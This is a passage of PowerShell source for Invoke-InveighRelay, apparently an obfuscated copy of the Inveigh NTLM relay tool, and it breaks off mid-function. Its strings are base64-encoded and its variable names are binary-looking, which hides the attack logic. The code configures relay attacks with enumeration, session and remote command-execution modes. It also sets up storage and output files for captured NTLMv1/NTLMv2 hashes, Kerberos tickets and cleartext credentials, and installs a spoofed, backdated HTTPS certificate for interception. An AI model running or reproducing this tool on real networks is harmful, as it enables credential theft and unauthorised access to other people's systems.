function Invoke-InveighRelay
{
[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][ValidateSet("Enumerate","Session","Execute")][Array]$Attack = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA=')))),
    [parameter(Mandatory=$false)][ValidateSet("All","NetSession","Share","User","Group")][String]$Enumerate = "All",
    [parameter(Mandatory=$false)][ValidateSet("Random","Strict")][String]$TargetMode = "Random",
    [parameter(Mandatory=$false)][String]$EnumerateGroup = "Administrators",
    [parameter(Mandatory=$false)][Array]$DomainMapping = "",
    [parameter(Mandatory=$false)][Array]$Target = "",
    [parameter(Mandatory=$false)][Array]$TargetExclude = "",
    [parameter(Mandatory=$false)][Array]$ProxyIgnore = "Firefox",
    [parameter(Mandatory=$false)][Array]$Username = "",
    [parameter(Mandatory=$false)][Array]$WPADAuthIgnore = "",
    [parameter(Mandatory=$false)][Int]$ConsoleQueueLimit = "-1",
    [parameter(Mandatory=$false)][Int]$ConsoleStatus = "",
    [parameter(Mandatory=$false)][Int]$FailedLoginThreshold = "2",
    [parameter(Mandatory=$false)][Int]$HTTPPort = "80",
    [parameter(Mandatory=$false)][Int]$HTTPSPort = "443",
    [parameter(Mandatory=$false)][Int]$ProxyPort = "8492",
    [parameter(Mandatory=$false)][Int]$RunTime = "",
    [parameter(Mandatory=$false)][Int]$SessionLimitPriv = "2",
    [parameter(Mandatory=$false)][Int]$SessionLimitShare = "2",
    [parameter(Mandatory=$false)][Int]$SessionLimitUnpriv = "0",
    [parameter(Mandatory=$false)][Int]$SessionRefresh = "10",
    [parameter(Mandatory=$false)][Int]$TargetRefresh = "60",
    [parameter(Mandatory=$false)][Int]$RepeatEnumerate = "30",
    [parameter(Mandatory=$false)][Int]$RepeatExecute = "30",
    [parameter(Mandatory=$false)][String]$Command = "",
    [parameter(Mandatory=$false)][String]$HTTPSCertIssuer = "Inveigh",
    [parameter(Mandatory=$false)][String]$HTTPSCertSubject = "localhost",
    [parameter(Mandatory=$false)][String]$Service,
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ConsoleUnique = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FailedLoginStrict = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileUnique = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTP = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPS = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPSForceCertDelete = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LogOutput = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$MachineAccounts = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$OutputStreamOnly = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$Proxy = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$RelayAutoDisable = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$RelayAutoExit = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SessionPriority = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShowHelp = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StartupChecks = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StatusOutput = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N","Low","Medium")][String]$ConsoleOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool = "0",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","NTLM")][String]$WPADAuth = "NTLM",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$FileOutputDirectory = "",
    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP = "0.0.0.0",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$ProxyIP = "0.0.0.0",
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)
if ($invalid_parameter)
{
    echo "[-] $($invalid_parameter) is not a valid parameter."
    throw
}
if(${10001101011100010}.relay_running)
{
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABJAG4AdgBlAGkAZwBoACAAUgBlAGwAYQB5ACAAaQBzACAAYQBsAHIAZQBhAGQAeQAgAHIAdQBuAG4AaQBuAGcA')))
    throw
}
${10001010010111001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAuADUA')))
if(!$target -and !${10001101011100010}.enumerate)
{
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABOAG8AIABlAG4AdQBtAGUAcgBhAHQAZQBkACAAdABhAHIAZwBlAHQAIABkAGEAdABhACwAIABzAHAAZQBjAGkAZgB5ACAAdABhAHIAZwBlAHQAcwAgAHcAaQB0AGgAIAAtAFQAYQByAGcAZQB0AA==')))
    throw
}
if($ProxyIP -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAuADAALgAwAC4AMAA='))))
{
    try
    {
        ${10110101100110011} = (Test-Connection 127.0.0.1 -count 1 | select -ExpandProperty Ipv4Address)
    }
    catch
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABFAHIAcgBvAHIAIABmAGkAbgBkAGkAbgBnACAAcAByAG8AeAB5ACAASQBQACwAIABzAHAAZQBjAGkAZgB5ACAAbQBhAG4AdQBhAGwAbAB5ACAAdwBpAHQAaAAgAC0AUAByAG8AeAB5AEkAUAA=')))
        throw
    }
}
if($Attack -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQA='))) -and !$Command)
{
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAtAEMAbwBtAG0AYQBuAGQAIAByAGUAcQB1AGkAcgBlAGQAIAB3AGkAdABoACAALQBBAHQAdABhAGMAawAgAEUAeABlAGMAdQB0AGUA')))
    throw
}
if($DomainMapping)
{
    if($DomainMapping.Count -ne 2 -or $DomainMapping[0] -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuACoA'))) -or $DomainMapping[1] -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuACoA'))))
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAtAEQAbwBtAGEAaQBuAE0AYQBwAHAAaQBuAGcAIABmAG8AcgBtAGEAdAAgAGkAcwAgAGkAbgBjAG8AcgByAGUAYwB0AA==')))
        throw
    }
}
if(!$FileOutputDirectory)
{ 
    ${01001011001111101} = $PWD.Path
}
else
{
    ${01001011001111101} = $FileOutputDirectory
}
if(!${10001101011100010})
{
    ${global:10001101011100010} = [HashTable]::Synchronized(@{})
    ${10001101011100010}.cleartext_list = New-Object System.Collections.ArrayList
    ${10001101011100010}.enumerate = New-Object System.Collections.ArrayList
    ${10001101011100010}.IP_capture_list = New-Object System.Collections.ArrayList
    ${10001101011100010}.log = New-Object System.Collections.ArrayList
    ${10001101011100010}.kerberos_TGT_list = New-Object System.Collections.ArrayList
    ${10001101011100010}.kerberos_TGT_username_list = New-Object System.Collections.ArrayList
    ${10001101011100010}.NTLMv1_list = New-Object System.Collections.ArrayList
    ${10001101011100010}.NTLMv1_username_list = New-Object System.Collections.ArrayList
    ${10001101011100010}.NTLMv2_list = New-Object System.Collections.ArrayList
    ${10001101011100010}.NTLMv2_username_list = New-Object System.Collections.ArrayList
    ${10001101011100010}.POST_request_list = New-Object System.Collections.ArrayList
    ${10001101011100010}.valid_host_list = New-Object System.Collections.ArrayList
    ${10001101011100010}.ADIDNS_table = [HashTable]::Synchronized(@{})
    ${10001101011100010}.relay_privilege_table = [HashTable]::Synchronized(@{})
    ${10001101011100010}.relay_failed_login_table = [HashTable]::Synchronized(@{})
    ${10001101011100010}.relay_history_table = [HashTable]::Synchronized(@{})
    ${10001101011100010}.request_table = [HashTable]::Synchronized(@{})
    ${10001101011100010}.session_socket_table = [HashTable]::Synchronized(@{})
    ${10001101011100010}.session_table = [HashTable]::Synchronized(@{})
    ${10001101011100010}.session_message_ID_table = [HashTable]::Synchronized(@{})
    ${10001101011100010}.session_lock_table = [HashTable]::Synchronized(@{})
    ${10001101011100010}.SMB_session_table = [HashTable]::Synchronized(@{})
    ${10001101011100010}.domain_mapping_table = [HashTable]::Synchronized(@{})
    ${10001101011100010}.group_table = [HashTable]::Synchronized(@{})
    ${10001101011100010}.session_count = 0
    ${10001101011100010}.session = @()
}
${10001101011100010}.stop = $false
if(!${10001101011100010}.running)
{
    ${10001101011100010}.cleartext_file_queue = New-Object System.Collections.ArrayList
    ${10001101011100010}.console_queue = New-Object System.Collections.ArrayList
    ${10001101011100010}.log_file_queue = New-Object System.Collections.ArrayList
    ${10001101011100010}.NTLMv1_file_queue = New-Object System.Collections.ArrayList
    ${10001101011100010}.NTLMv2_file_queue = New-Object System.Collections.ArrayList
    ${10001101011100010}.output_queue = New-Object System.Collections.ArrayList
    ${10001101011100010}.POST_request_file_queue = New-Object System.Collections.ArrayList
    ${10001101011100010}.HTTP_session_table = [HashTable]::Synchronized(@{})
    ${10001101011100010}.console_input = $true
    ${10001101011100010}.console_output = $false
    ${10001101011100010}.file_output = $false
    ${10001101011100010}.HTTPS_existing_certificate = $false
    ${10001101011100010}.HTTPS_force_certificate_delete = $false
    ${10001101011100010}.log_output = $true
    ${10001101011100010}.cleartext_out_file = ${01001011001111101} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0AQwBsAGUAYQByAHQAZQB4AHQALgB0AHgAdAA=')))
    ${10001101011100010}.log_out_file = ${01001011001111101} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0ATABvAGcALgB0AHgAdAA=')))
    ${10001101011100010}.NTLMv1_out_file = ${01001011001111101} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0ATgBUAEwATQB2ADEALgB0AHgAdAA=')))
    ${10001101011100010}.NTLMv2_out_file = ${01001011001111101} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0ATgBUAEwATQB2ADIALgB0AHgAdAA=')))
    ${10001101011100010}.POST_request_out_file = ${01001011001111101} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0ARgBvAHIAbQBJAG4AcAB1AHQALgB0AHgAdAA=')))
}
if($StartupChecks -eq 'Y')
{
    ${01001100011011101} = netsh advfirewall show allprofiles state | ? {$_ -match 'ON'}
    if($HTTP -eq 'Y')
    {
        ${01011001101000110} = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$HTTPPort "
    }
    if($HTTPS -eq 'Y')
    {
        ${10101011110010010} = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$HTTPSPort "
    }
    if($Proxy -eq 'Y')
    {
        ${01100101011011111} = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$ProxyPort "
    }
}
${10001101011100010}.relay_running = $true
${10001101011100010}.SMB_relay = $true
if($StatusOutput -eq 'Y')
{
    ${10001101011100010}.status_output = $true
}
else
{
    ${10001101011100010}.status_output = $false
}
if($OutputStreamOnly -eq 'Y')
{
    ${10001101011100010}.output_stream_only = $true
}
else
{
    ${10001101011100010}.output_stream_only = $false
}
if($Tool -eq 1) 
{
    ${10001101011100010}.tool = 1
    ${10001101011100010}.output_stream_only = $true
    ${10001101011100010}.newline = $null
    $ConsoleOutput = "N"
}
elseif($Tool -eq 2) 
{
    ${10001101011100010}.tool = 2
    ${10001101011100010}.output_stream_only = $true
    ${10001101011100010}.console_input = $false
    ${10001101011100010}.newline = $null
    $LogOutput = "N"
    $ShowHelp = "N"
    switch ($ConsoleOutput)
    {
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcA')))
        {
            $ConsoleOutput = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcA')))
        }
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGQAaQB1AG0A')))
        {
            $ConsoleOutput = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGQAaQB1AG0A')))
        }
        default
        {
            $ConsoleOutput = "Y"
        }
    }
}
else
{
    ${10001101011100010}.tool = 0
    ${10001101011100010}.newline = $null
}
${10001101011100010}.output_queue.Add("[*] Inveigh Relay ${10001010010111001} started at $(Get-Date -format s)") > $null
if(${01001100011011101})
{
    ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABXAGkAbgBkAG8AdwBzACAARgBpAHIAZQB3AGEAbABsACAAPQAgAEUAbgBhAGIAbABlAGQA'))))  > $null
}
if($HTTP -eq 'Y')
{
    if(${01011001101000110})
    {
        $HTTP = "N"
        ${10001101011100010}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABIAFQAVABQACAAQwBhAHAAdAB1AHIAZQAvAFIAZQBsAGEAeQAgAEQAaQBzAGEAYgBsAGUAZAAgAEQAdQBlACAAVABvACAASQBuACAAVQBzAGUAIABQAG8AcgB0ACAAJABIAFQAVABQAFAAbwByAHQA'))))  > $null
    }
    else
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQACAAQwBhAHAAdAB1AHIAZQAvAFIAZQBsAGEAeQAgAD0AIABFAG4AYQBiAGwAZQBkAA=='))))  > $null
        if($HTTPIP)
        {
            ${10001101011100010}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQACAASQBQACAAQQBkAGQAcgBlAHMAcwAgAD0AIAAkAEgAVABUAFAASQBQAA==')))) > $null
        }
        if($HTTPPort -ne 80)
        {
            ${10001101011100010}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQACAAUABvAHIAdAAgAD0AIAAkAEgAVABUAFAAUABvAHIAdAA=')))) > $null
        }
    }
}
else
{
    ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQACAAQwBhAHAAdAB1AHIAZQAvAFIAZQBsAGEAeQAgAD0AIABEAGkAcwBhAGIAbABlAGQA'))))  > $null
}
if($HTTPS -eq 'Y')
{
    if(${10101011110010010})
    {
        $HTTPS = "N"
        ${10001101011100010}.HTTPS = $false
        ${10001101011100010}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABIAFQAVABQAFMAIABDAGEAcAB0AHUAcgBlAC8AUgBlAGwAYQB5ACAARABpAHMAYQBiAGwAZQBkACAARAB1AGUAIABUAG8AIABJAG4AIABVAHMAZQAgAFAAbwByAHQAIAAkAEgAVABUAFAAUwBQAG8AcgB0AA=='))))  > $null
    }
    else
    {
        try
        {
            ${10001101011100010}.certificate_issuer = $HTTPSCertIssuer
            ${10001101011100010}.certificate_CN = $HTTPSCertSubject
            ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQAFMAIABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABJAHMAcwB1AGUAcgAgAD0AIAA='))) + ${10001101011100010}.certificate_issuer)  > $null
            ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQAFMAIABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABDAE4AIAA9ACAA'))) + ${10001101011100010}.certificate_CN)  > $null
            ${10101111100110111} = (ls Cert:\LocalMachine\My | ? {$_.Issuer -match ${10001101011100010}.certificate_issuer})
            if(!${10101111100110111})
            {
                ${00110011111111011} = new-object -com $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA1ADAAOQBFAG4AcgBvAGwAbABtAGUAbgB0AC4AQwBYADUAMAAwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA=')))
                ${00110011111111011}.Encode( $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0A'))) + ${10001101011100010}.certificate_CN, ${00110011111111011}.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
                ${00000000110111111} = new-object -com $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA1ADAAOQBFAG4AcgBvAGwAbABtAGUAbgB0AC4AQwBYADUAMAAwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA=')))
                ${00000000110111111}.Encode($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0A'))) + ${10001101011100010}.certificate_issuer, ${00110011111111011}.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
                ${01011001011101110} = new-object -com $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA1ADAAOQBFAG4AcgBvAGwAbABtAGUAbgB0AC4AQwBYADUAMAA5AFAAcgBpAHYAYQB0AGUASwBlAHkA')))
                ${01011001011101110}.ProviderName = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQAIABFAG4AaABhAG4AYwBlAGQAIABSAFMAQQAgAGEAbgBkACAAQQBFAFMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByAA==')))
                ${01011001011101110}.KeySpec = 2
                ${01011001011101110}.Length = 2048
			    ${01011001011101110}.MachineContext = 1
                ${01011001011101110}.Create()
                ${01001111111101110} = new-object -com $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA1ADAAOQBFAG4AcgBvAGwAbABtAGUAbgB0AC4AQwBPAGIAagBlAGMAdABJAGQA')))
			    ${01001111111101110}.InitializeFromValue($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAuADMALgA2AC4AMQAuADUALgA1AC4ANwAuADMALgAxAA=='))))
			    ${00011010001000010} = new-object -com $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA1ADAAOQBFAG4AcgBvAGwAbABtAGUAbgB0AC4AQwBPAGIAagBlAGMAdABJAGQAcwAuADEA')))
			    ${00011010001000010}.add(${01001111111101110})
			    ${01101001011000110} = new-object -com $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA1ADAAOQBFAG4AcgBvAGwAbABtAGUAbgB0AC4AQwBYADUAMAA5AEUAeAB0AGUAbgBzAGkAbwBuAEUAbgBoAGEAbgBjAGUAZABLAGUAeQBVAHMAYQBnAGUA')))
			    ${01101001011000110}.InitializeEncode(${00011010001000010})
			    ${10100101011101001} = new-object -com $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA1ADAAOQBFAG4AcgBvAGwAbABtAGUAbgB0AC4AQwBYADUAMAA5AEMAZQByAHQAaQBmAGkAYwBhAHQAZQBSAGUAcQB1AGUAcwB0AEMAZQByAHQAaQBmAGkAYwBhAHQAZQA=')))
			    ${10100101011101001}.InitializeFromPrivateKey(2,${01011001011101110},"")
			    ${10100101011101001}.Subject = ${00110011111111011}
			    ${10100101011101001}.Issuer = ${00000000110111111}
			    ${10100101011101001}.NotBefore = (get-date).AddDays(-271)
			    ${10100101011101001}.NotAfter = ${10100101011101001}.NotBefore.AddDays(824)
			    ${01011000111000001} = New-Object -ComObject X509Enrollment.CObjectId
			    ${01011000111000001}.InitializeFromAlgorithmName(1,0,0,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBIAEEAMgA1ADYA'))))
			    ${10100101011101001}.HashAlgorithm = ${01011000111000001}
                ${10100101011101001}.X509Extensions.Add(${01101001011000110})
                ${00000011011011111} = new-object -com $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA1ADAAOQBFAG4AcgBvAGwAbABtAGUAbgB0AC4AQwBYADUAMAA5AEUAeAB0AGUAbgBzAGkAbwBuAEIAYQBzAGkAYwBDAG8AbgBzAHQAcgBhAGkAbgB0AHMA')))
			    ${00000011011011111}.InitializeEncode($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAZQA='))),1)
                ${10100101011101001}.X509Extensions.Add(${00000011011011111})
                ${10100101011101001}.Encode()
                ${01001111111100110} = new-object -com $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WAA1ADAAOQBFAG4AcgBvAGwAbABtAGUAbgB0AC4AQwBYADUAMAA5AEUAbgByAG8AbABsAG0AZQBuAHQA')))
			    ${01001111111100110}.InitializeFromRequest(${10100101011101001})
			    ${10110011111010000} = ${01001111111100110}.CreateRequest(0)
                ${01001111111100110}.InstallResponse(2,${10110011111010000},0,"")
                ${10001101011100010}.certificate = (ls Cert:\LocalMachine\My | ? {$_.Issuer -match ${10001101011100010}.certificate_issuer})
                ${10001101011100010}.HTTPS = $true
                ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQAFMAIABDAGEAcAB0AHUAcgBlAC8AUgBlAGwAYQB5ACAAPQAgAEUAbgBhAGIAbABlAGQA'))))  > $null
            }
            else
            {
                if($HTTPSForceCertDelete -eq 'Y')
                {
                    ${10001101011100010}.HTTPS_force_certificate_delete = $true
                }
                ${10001101011100010}.HTTPS_existing_certificate = $true
                ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQAFMAIABDAGEAcAB0AHUAcgBlACAAPQAgAFUAcwBpAG4AZwAgAEUAeABpAHMAdABpAG4AZwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQA='))))  > $null
            }
        }
        catch
        {
            $HTTPS = "N"
            ${10001101011100010}.HTTPS = $false
            ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABIAFQAVABQAFMAIABDAGEAcAB0AHUAcgBlAC8AUgBlAGwAYQB5ACAARABpAHMAYQBiAGwAZQBkACAARAB1AGUAIABUAG8AIABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABFAHIAcgBvAHIA'))))  > $null
        }
    }
}
else
{
    ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQAFMAIABDAGEAcAB0AHUAcgBlAC8AUgBlAGwAYQB5ACAAPQAgAEQAaQBzAGEAYgBsAGUAZAA='))))  > $null
}
if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
{
    if($Challenge)
    {
        ${10001101011100010}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABIAFQAVABQACAATgBUAEwATQAgAEMAaABhAGwAbABlAG4AZwBlACAAPQAgACQAQwBoAGEAbABsAGUAbgBnAGUA'))))  > $null
    }
    if($MachineAccounts -eq 'N')
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABNAGEAYwBoAGkAbgBlACAAQQBjAGMAbwB1AG4AdAAgAEMAYQBwAHQAdQByAGUAIAA9ACAARABpAHMAYQBiAGwAZQBkAA==')))) > $null
        ${10001101011100010}.machine_accounts = $false
    }
    else
    {
        ${10001101011100010}.machine_accounts = $true
    }
    ${10001101011100010}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABXAFAAQQBEACAAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACAAPQAgACQAVwBQAEEARABBAHUAdABoAA==')))) > $null
    if($WPADAuth -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA='))))
    {
        $WPADAuthIgnore = ($WPADAuthIgnore | ? {$_ -and $_.Trim()})
        if($WPADAuthIgnore.Count -gt 0)
        {
            ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABXAFAAQQBEACAATgBUAEwATQAgAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAATABpAHMAdAAgAD0AIAA='))) + ($WPADAuthIgnore -join ","))  > $null
        }
    }
}
if($Proxy -eq 'Y')
{
    if(${01100101011011111})
    {
        $HTTP = "N"
        ${10001101011100010}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABQAHIAbwB4AHkAIABDAGEAcAB0AHUAcgBlAC8AUgBlAGwAYQB5ACAARABpAHMAYQBiAGwAZQBkACAARAB1AGUAIABUAG8AIABJAG4AIABVAHMAZQAgAFAAbwByAHQAIAAkAFAAcgBvAHgAeQBQAG8AcgB0AA=='))))  > $null
    }
    else
    {
        ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABQAHIAbwB4AHkAIABDAGEAcAB0AHUAcgBlAC8AUgBlAGwAYQB5ACAAPQAgAEUAbgBhAGIAbABlAGQA'))))  > $null
        ${10001101011100010}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABQAHIAbwB4AHkAIABQAG8AcgB0ACAAPQAgACQAUAByAG8AeAB5AFAAbwByAHQA')))) > $null
        ${10011010111000000} = $ProxyPort + 1
        ${10000101100010011} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAARgBpAG4AZABQAHIAbwB4AHkARgBvAHIAVQBSAEwAKAB1AHIAbAAsAGgAbwBzAHQAKQB7AHIAZQB0AHUAcgBuACAAIgBQAFIATwBYAFkAIAAkAHsAMQAwADEAMQAwADEAMAAxADEAMAAwADEAMQAwADAAMQAxAH0AOgAkAFAAcgBvAHgAeQBQAG8AcgB0ADsAIABQAFIATwBYAFkAIAAkAHsAMQAwADEAMQAwADEAMAAxADEAMAAwADEAMQAwADAAMQAxAH0AOgAkAHsAMQAwADAAMQAxADAAMQAwADEAMQAxADAAMAAwADAAMAAwAH0AOwAgAEQASQBSAEUAQwBUACIAOwB9AA==')))
        $ProxyIgnore = ($ProxyIgnore | ? {$_ -and $_.Trim()})
        if($ProxyIgnore.Count -gt 0)
        {
            ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABQAHIAbwB4AHkAIABJAGcAbgBvAHIAZQAgAEwAaQBzAHQAIAA9ACAA'))) + ($ProxyIgnore -join ","))  > $null
        }
    }
}
if($DomainMapping)
{
    ${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABEAG8AbQBhAGkAbgAgAE0AYQBwAHAAaQBuAGcAIAA9ACAA'))) + ($DomainMapping -join ","))  > $null
    ${10001101011100010}.netBIOS_domain = $DomainMapping[0]
    ${10001101011100010}.DNS_domain = $DomainMapping[1]
}
${10001101011100010}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAbABhAHkAIABBAHQAdABhAGMAawAgAD0AIAA='))) + ($Attack -join ",")) > $null
function _10010110010010101
{
    param(${_01010101101100010},${_10111100111100101},${_01011000111110001},${_10010100001111011})
    function _01001000001000000
    { 
        param(${_01010101101100010}) 
        ${10110000110011111} = ${_01010101101100010}.split(".")
        return [int64]([int64]${10110000110011111}[0] * 16777216 + [int64]${10110000110011111}[1]*65536 + [int64]${10110000110011111}[2] * 256 + [int64]${10110000110011111}[3]) 
    } 
    function _01000110000100010
    { 
        param ([int64]${_00101110010010011}) 
        return (([math]::truncate(${_00101110010010011}/16777216)).tostring() + "." +([math]::truncate((${_00101110010010011}%16777216)/65536)).tostring() + "." + ([math]::truncate((${_00101110010010011}%65536)/256)).tostring() + "." +([math]::truncate(${_00101110010010011}%256)).tostring())
    }
    ${10001101011011001} = New-Object System.Collections.ArrayList
    if(${_01010101101100010})
    {
        ${01110100111010000} = [System.Net.IPAddress]::Parse(${_01010101101100010})
    }
    if(${_10111100111100101})
    {
        ${01011111100100100} = [System.Net.IPAddress]::Parse((_01000110000100010 -_00101110010010011 ([convert]::ToInt64(("1" * ${_10111100111100101} + "0" * (32 - ${_10111100111100101})),2))))
    }
    if(${_01010101101100010})
    {
        ${00110100110000100} = New-Object System.Net.IPAddress (${01011111100100100}.address -band ${01110100111010000}.address)
    }
    if(${_01010101101100010})
    {
